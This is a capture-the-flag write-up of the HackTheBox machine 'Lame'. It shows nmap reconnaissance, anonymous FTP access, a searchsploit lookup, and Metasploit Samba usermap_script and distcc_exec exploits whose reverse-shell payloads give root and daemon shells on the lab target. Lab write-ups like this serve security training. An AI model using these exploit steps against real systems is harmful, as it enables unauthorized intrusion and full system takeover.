# Lame | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-fgpcxkclmf]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.44.18
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-19 10:56 UTC
Nmap scan report for 10.129.44.18
Host is up (0.22s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.32
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h33m49s, deviation: 3h32m08s, median: 3m48s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-11-19T06:03:44-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   222.90 ms 10.10.14.1
2   225.11 ms 10.129.44.18

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 237.30 seconds
```
The target has FTP, SSH, SMB and a distccd service running.

### 2. Check out each service
Since it allows anoynomous login, it's an easy first thing to do.
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-fgpcxkclmf]─[~]
└──╼ [★]$ ftp 10.129.44.18
Connected to 10.129.44.18.
220 (vsFTPd 2.3.4)
Name (10.129.44.18:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```
There is nothing on the FTP server. The FTP server version itself (as seen in the nmap scan) is well-known to be compromised with a backdoor, which is supposed to grant root access once exploited, but of course that doesn't work. For now I'll move on to SMB, which is also potentially vulnerable.
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-fgpcxkclmf]─[~]
└──╼ [★]$ searchsploit samba 3.0.20
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                         | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploi | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                          | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                          | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                  | linux_x86/dos/36741.py
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### 3. Get a shell and root
I can attempt the username map command execution.
```bash
msf5 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.129.44.18     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.32      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.14.32:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo xyqyDrYiulln5etq;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "xyqyDrYiulln5etq\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.32:4444 -> 10.129.44.18:38095) at 2020-11-19 11:53:05 +0000

whoami
root
```
This exploit immediately opens me a root shell on the machine.

### 4. Keep going and get another shell
I'll back out and see if I can find any other remotely-exploitable paths.  
The final service I have to look into is distccd. There is also a command exec vulnerability with this application that can be exploited.
```bash
msf5 exploit(unix/misc/distcc_exec) > run

[*] Started reverse TCP double handler on 10.10.14.32:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo UlyfkB0ilJYkCmbw;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "UlyfkB0ilJYkCmbw\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (10.10.14.32:4444 -> 10.129.44.18:56772) at 2020-11-19 12:00:31 +0000

whoami
daemon
```